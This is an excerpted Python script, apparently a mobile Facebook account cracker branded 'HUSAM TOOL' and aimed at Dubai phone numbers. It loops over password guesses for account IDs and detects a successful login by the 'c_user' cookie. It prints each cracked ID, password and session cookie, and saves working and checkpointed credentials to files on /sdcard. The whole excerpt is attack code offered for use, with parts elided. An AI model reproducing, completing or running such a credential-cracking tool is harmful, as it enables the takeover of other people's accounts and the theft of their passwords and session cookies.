...
\033[1;32m     \033[1;35mCITY         :  \033[1;35mDUBAI
 
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
 
\033[1;37m================= \33[32;45mHUSAM\33[0;m =====================
 
 
 
       \33[37;41m\t WELLCOME TO HUSAM TOOL\33[0;m
...
def i():
    ...
    jalan('\033[1;36m     \t     DUBAI CODES\n     \033[1;33m97150, \033[1;33m97152 ,\033[1;33m97158 ,\033[1;33m97155  ...\033[0;97m')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(HUSAM)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
 
                cek_apk(session,coki)
 
                open('/sdcard/HUSAM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(HUSAM)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
 
                open('/sdcard/HUSAM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[HUSAM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
